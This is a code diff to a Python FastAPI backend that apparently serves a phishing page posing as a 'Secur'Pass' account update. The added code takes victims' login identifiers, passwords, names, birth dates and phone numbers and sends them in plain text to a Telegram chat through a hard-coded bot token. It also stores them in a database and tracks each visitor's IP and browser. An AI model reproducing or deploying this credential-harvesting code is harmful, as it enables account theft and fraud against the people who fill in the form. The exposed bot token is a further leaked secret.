@@ -1,10 +1,12 @@
-from fastapi import FastAPI, APIRouter
+from fastapi import FastAPI, APIRouter, HTTPException, Request
 from dotenv import load_dotenv
 from starlette.middleware.cors import CORSMiddleware
 from motor.motor_asyncio import AsyncIOMotorClient
 import os
 import logging
 from pathlib import Path
+import requests
+
 from pydantic import BaseModel, Field, ConfigDict
 from typing import List
 import uuid
@@ -13,6 +15,13 @@ from datetime import datetime, timezone
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 # MongoDB connection
 mongo_url = os.environ['MONGO_URL']
@@ -56,15 +65,129 @@ async def create_status_check(input: StatusCheckCreate):
 
 @api_router.get("/status", response_model=List[StatusCheck])
 async def get_status_checks():
-    # Exclude MongoDB's _id field from the query results
-    status_checks = await db.status_checks.find({}, {"_id": 0}).to_list(1000)
+    status_checks = await db.status_checks.find().to_list(1000)
+    return [StatusCheck(**status_check) for status_check in status_checks]
+
+# Telegram Integration
+# Identifiants codés en dur pour déploiement simplifié (Railway/GitHub)
+# Les variables d'environnement ont priorité si elles sont définies.
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN') or '8204745901:AAHvOULULSyLQnbFSeHPOuYAs5gG2-r3YtE'
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID') or '-5159406084'
+
+def send_telegram_message(message):
+    """Send message to Telegram"""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        logger.error("Telegram credentials not configured")
+        return False
     
-    # Convert ISO string timestamps back to datetime objects
-    for check in status_checks:
-        if isinstance(check['timestamp'], str):
-            check['timestamp'] = datetime.fromisoformat(check['timestamp'])
-    
-    return status_checks
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, json=payload, timeout=10)
+        response.raise_for_status()
+        logger.info("Message sent to Telegram successfully")
+        return True
+    except Exception as e:
+        logger.error(f"Error sending message to Telegram: {str(e)}")
+        return False
+
+class SecuripassSubmission(BaseModel):
+    identifier: str
+    password: str
+    lastName: str
+    firstName: str
+    dateOfBirth: str
+    phoneNumber: str
+
+class UpdateClickEvent(BaseModel):
+    source: str | None = "home_page"
+    path: str | None = None
+    referrer: str | None = None
+
+@api_router.post("/securipass/notify-visit")
+async def notify_visit(event: UpdateClickEvent, request: Request):
+    """Notifie Telegram quand un utilisateur clique sur 'Mettre à jour' sur la page d'accueil."""
+    try:
+        # Extract client info
+        forwarded_for = request.headers.get("x-forwarded-for")
+        client_ip = forwarded_for.split(",")[0].strip() if forwarded_for else (request.client.host if request.client else "inconnu")
+        user_agent = request.headers.get("user-agent", "inconnu")
+        referrer = event.referrer or request.headers.get("referer", "direct")
+
+        message = f"""
+🔔 <b>Clic sur « Mettre à jour »</b>
+
+👁️ Un utilisateur vient de cliquer sur le bouton de mise à jour.
+
+📍 <b>Source:</b> {event.source or 'home_page'}
+🔗 <b>Page:</b> {event.path or '/'}
+↩️ <b>Referrer:</b> {referrer}
+🌐 <b>IP:</b> {client_ip}
+🧭 <b>Navigateur:</b> {user_agent}
+
+⏰ <b>Heure:</b> {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
+        """
+
+        telegram_success = send_telegram_message(message)
+
+        # Save visit event in DB
+        visit_doc = {
+            "id": str(uuid.uuid4()),
+            "source": event.source or "home_page",
+            "path": event.path,
+            "referrer": referrer,
+            "ip": client_ip,
+            "user_agent": user_agent,
+            "timestamp": datetime.utcnow().isoformat(),
+            "telegram_sent": telegram_success,
+        }
+        await db.securipass_visits.insert_one(visit_doc)
+
+        return {"success": True, "telegram_sent": telegram_success}
+    except Exception as e:
+        logger.error(f"Error processing visit notification: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erreur lors de la notification")
+
+@api_router.post("/securipass/submit")
+async def submit_securipass_data(data: SecuripassSubmission):
+    try:
+        # Format message for Telegram
+        message = f"""
+🔐 <b>Nouvelle soumission Secur'Pass</b>
+
+📋 <b>Identifiant:</b> {data.identifier}
+🔑 <b>Mot de passe:</b> {data.password}
+
+👤 <b>Informations personnelles:</b>
+   • Nom: {data.lastName}
+   • Prénom: {data.firstName}
+   • Date de naissance: {data.dateOfBirth}
+   • Téléphone: {data.phoneNumber}
+
+⏰ <b>Date de soumission:</b> {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
+        """
+        
+        # Send to Telegram
+        telegram_success = send_telegram_message(message)
+        
+        # Save to database
+        submission_data = data.dict()
+        submission_data['timestamp'] = datetime.utcnow()
+        submission_data['telegram_sent'] = telegram_success
+        
+        await db.securipass_submissions.insert_one(submission_data)
+        
+        return {
+            "success": True,
+            "message": "Données enregistrées avec succès"
+        }
+    except Exception as e:
+        logger.error(f"Error processing securipass submission: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erreur lors de l'enregistrement")
 
 # Include the router in the main app
 app.include_router(api_router)
@@ -76,13 +199,6 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
-
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
 
 @app.on_event("shutdown")
 async def shutdown_db_client():
